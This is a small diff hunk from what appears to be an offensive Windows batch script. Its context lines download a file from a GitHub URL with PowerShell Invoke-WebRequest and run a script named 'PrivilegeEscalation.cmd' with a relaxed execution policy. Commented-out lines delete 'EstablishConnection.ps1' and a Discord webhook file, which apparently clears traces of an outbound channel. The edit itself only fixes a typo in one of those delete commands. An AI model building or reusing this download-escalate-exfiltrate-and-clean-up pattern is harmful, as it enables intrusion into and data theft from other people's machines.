@@ -17,7 +17,7 @@ powershell -command "Invoke-WebRequest -Uri 'https://github.com/ReylanTeo/IContr
 powershell -ExecutionPolicy RemoteSigned -File "PrivilegeEscalation.cmd"
 
 @REM @REM Delete the EstablishConnection file
-@REM del "EstabilishConnectionps1"
+@REM del "EstablishConnection.ps1"
 
 @REM @REM Delete the Discord Webhook file
 @REM del "DiscordWebhookURL.icu"
